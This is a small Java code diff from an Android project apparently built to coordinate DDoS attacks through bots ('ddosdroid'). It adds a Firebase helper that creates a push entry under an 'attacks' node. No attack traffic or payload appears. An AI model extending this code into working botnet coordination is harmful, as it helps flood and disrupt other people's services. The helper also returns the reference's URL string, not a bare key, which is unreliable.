@@ -2,6 +2,9 @@ package gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack;
 
 import android.util.Log;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 import java.util.List;
 
 import gr.kalymnos.sk3m3l10.ddosdroid.pojos.bot.Bot;
@@ -31,5 +34,11 @@ public final class Attacks {
 
     public static boolean ownedBy(Attack attack, Bot bot) {
         return attack.getHostInfo().getUuid().equals(bot.getUuid());
+    }
+
+    public static String createPushId(){
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        DatabaseReference attacks = database.getReference().child("attacks");
+        return attacks.push().toString();
     }
 }
